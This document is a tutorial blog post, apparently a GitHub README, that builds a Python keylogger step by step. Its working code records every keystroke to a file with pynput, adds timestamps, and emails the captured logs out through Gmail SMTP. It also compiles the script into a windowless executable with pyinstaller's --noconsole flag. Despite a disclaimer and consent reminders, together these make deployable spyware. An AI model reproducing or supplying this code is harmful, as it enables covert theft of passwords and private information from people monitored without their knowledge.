# PythonKeylogger
---
Keylogging in Python
Table of Contents
- Introduction to keylogging
- Disclaimer
- Step-by-step installation
 0. Tools and Requirements
 1. Install dependencies
 2. Creating the keylogger
 3. Include timestamps
 4. Receiving logs via email
 5. Converting to exe
 6. Stopping the keylogger
- Troubleshooting
- Sources

---

Introduction to keylogging
Keylogging is the use of a computer program to record every keystroke made by a user. While it can be used for malicious purposes such as stealing passwords, it also has legitimate uses in cybersecurity, parental control, and employee monitoring. Keylogging is also used for parental monitoring through applications like Spyrix and for companies to track employee productivity or troubleshoot technical issues. However, keylogging can also be used maliciously to steal sensitive information such as usernames, company data, social security numbers, banking details, and passwords.

---

Disclaimer
This blog is intended for educational and ethical research purposes only. Unauthorized use of keyloggers to monitor, record, or collect data from individuals without explicit consent is illegal and may violate local, national, or international laws. The author does not encourage or condone any illegal activity and is not responsible for any misuse of the information provided. Always ensure you have proper authorization before using keylogging software.

---

Step-by-step Installation
0. Tools and Requirements
PyCharm Community Edition
Notepad or any text editor
Terminal in code editor
Test Google Account

For this blog we will be using PyCharm Community Edition to handle the creation of our code and the installation of our libraries. You may use any Source code editor that uses python as well. Then, a text file (keylog.txt) where the logged keystrokes will be saved. Finally, a spare or dummy google account that will be receiving the txt file of our key logs
The main focus of this tutorial is to guide you into creating your first keystroke program in python. Detailed information on the libraries or components used will be linked.

---

Install Dependencies

First, install the pynput library, which allows us to capture keystrokes. Run the following command in your terminal:
pip install pynput

---

2. Creating the Keylogger
Second, we import a pynput.keyboard listener that listens for keyboard events. then, through the function on_press(), each key and special key (shift, ctrl, enter, etc.) pressed will be written to the keylog.txt that has the variable log_file. This script continuously logs keystrokes until it is manually stopped by the user.
# Adapted from Satyam Pathania's MIT Licensed keylogger
# Original source: https://github.com/Satyampathania/python-keylogger

from pynput.keyboard import Listener

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

with Listener(on_press=on_press) as listener:
    listener.join()
Result:
and there you have it, your very own keylogger! But, we can also add a few more tweaks to make our keylogger more practical and useful.

---

3. Include Timestamps
We can also include timestamps by modifying the on_press() function to include date and time to be written to the keys
import datetime

def on_press(key):
    with open(log_file, "a") as f:
        f.write(f"{datetime.datetime.now()} - {key}\n")
Result:

---

4. Receiving logs via email
Through the use of smtplib we can send our logs to our email account. In this case, we will be using a test or dummy Gmail account. input your email and password on the corresponding email and password variables. The Smtplib server will then start, login to your account, send mail to your email of the logs then close the server. For your password it is important to create an app password and use that instead as you may obtain an error due to google not allowing less secure apps such as raw SMTP to access Gmail with your normal password due to security risks. Be aware that Gmail may detect and block emails containing key logs, as it can be considered a security risk. Head to troubleshooting for the guide on creating your app password
import smtplib
import os

EMAIL = "your_email@gmail.com"
PASSWORD = "your_password"

def send_email():
    with open(log_file, "r") as f:
        logs = f.read()

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(EMAIL, PASSWORD)
    server.sendmail(EMAIL, EMAIL, logs)
    server.quit()

send_email()
Result:

---

5. Converting to exe
You can run your script on a system without Python installed by converting it into an executable (.exe). In terminal run the following:
pip install pyinstaller
pyinstaller --onefile --noconsole keylogger.py
this will then generate an executable file in dist/keylogger.exe, be sure to place keylog.txt file alongside the keylogger.exe to avoid an error such as this:

---

6. Stopping the keylogger
In order to stop your keylogger from recording your input. In python, stop the program in your ide, meanwhile, in exe, find the process in task manager and closing it manually there.
Congratulations! you have successfully created your first keylogger program. Remember to only use this ethically and with consent in order to avoid any repercussions that may fall on you. If there are any questions or issues please refer to the troubleshooting guide or comment below.

---

Troubleshooting
Unable to login to Gmail account with error:
File "C:\Users\XXX\AppData\Local\Programs\Python\Python312\Lib\smtplib.py", line 662, in auth
    raise SMTPAuthenticationError(code, resp)
smtplib.SMTPAuthenticationError: (534, b'5.7.9 Application-specific password required. For more information, go to\n5.7.9  https://support.google.com/mail/?p=InvalidSecondFactor d9443c01a7336-227811bdca7sm120987905ad.137 - gsmtp')
Go to "Manage your Google Account"
Under security go to 2-step verification 
Set up a phone number or use an authenticator etc.
Go to "App Passwords" in security
Create a name for the app (e.g. Keylogger, keylogger system, etc.)
Copy the given 16 character password
Replace the password in your code to the app password

---

Sources:
Basic Keylogger Code:
Adapted from Satyam Pathania's work under the MIT License. This blog follows the license terms by including proper attribution.
https://github.com/Satyampathania/python-keylogger
© 2024 Satyam Pathania
Modifications © 2025 ChaseJace
This project is licensed under the MIT License, which allows modification and redistribution with proper credit.
Information and library sources:
https://www.fortinet.com/resources/cyberglossary/what-is-keyloggers
https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/keylogger/#:~:text=Companies%20often%20use%20keylogger%20software,troubleshoot%20issues%20on%20a%20device.
https://www.fortinet.com/resources/cyberglossary/how-to-detect-keylogger-on-phone
https://pypi.org/project/pynput/
https://docs.python.org/3/library/smtplib.html
